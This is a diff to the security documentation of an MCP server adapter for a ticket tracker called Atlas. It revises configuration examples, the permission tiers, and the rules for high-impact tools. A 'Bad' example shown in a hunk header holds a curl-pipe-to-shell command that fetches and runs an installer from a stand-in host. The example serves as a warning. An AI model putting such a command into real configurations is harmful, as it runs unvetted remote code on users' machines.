@@ -18,8 +18,8 @@ Good:
 
 ```toml
 [mcp_servers.atlas]
-command = "/Users/you/bin/tracker"
-args = ["mcp", "serve", "--tool-profile", "read"]
+command = "/usr/local/bin/tracker"
+args = ["mcp", "serve", "--workspace", "/path/to/workspace", "--tool-profile", "read"]
 ```
 
 Bad:
@@ -32,9 +32,16 @@ args = ["-c", "curl https://example.invalid/install | sh && tracker mcp serve"]
 
 ## Safety Tiers
 
+Profiles widen cumulatively:
+
 1. `read`: read-only and plan/dry-run tools.
-2. `workflow`: safe Atlas mutations with actor, reason, permissions, event metadata, and write lock.
-3. `high-impact`: provider writes, sync/import/archive/compact/worktree cleanup, gate waive, ticket complete, and similar operations.
+2. `workflow`: Atlas ticket, agent, team, schedule, evidence, and handoff mutations with actor, reason, permissions, event metadata, and the write lock.
+3. `delivery`: workflow plus run dispatch and provider-backed change/check synchronization.
+4. `admin`: the full inventory.
+
+High-impact tools are a separate class inside delivery or admin. They cover provider review/merge,
+sync push/pull, bundle/import apply, archive apply/restore, compact, worktree cleanup, and gate waiver.
+`atlas.ticket.complete` is a normal workflow tool and still follows Atlas completion policy and gates.
 
 High-impact execution requires:
 
@@ -51,7 +58,7 @@ Denied high-impact attempts are written to `.tracker/runtime/mcp/security-audit.
 
 ## Governance Alignment
 
-The trust/governance model does not make Atlas MCP-first. MCP may expose safe read-only trust and governance status in a later adapter update, but it does not expose private-key operations and does not mutate trust by default.
+The trust/governance model does not make Atlas MCP-first. The adapter does not expose private-key operations or trust mutations.
 
 High-impact MCP tools evaluate the same service-layer permission and governance checks as CLI, shell, and TUI paths. MCP approval tokens remain a transport safety gate, not proof that the actor has Atlas authority.
 
@@ -59,4 +66,3 @@ High-impact MCP tools evaluate the same service-layer permission and governance 
 
 - [MCP tools specification](https://mcp.mintlify.app/specification/2025-11-25/server/tools)
 - [Official MCP Go SDK](https://github.com/modelcontextprotocol/go-sdk)
-- [OX Security MCP supply-chain advisory](https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/)
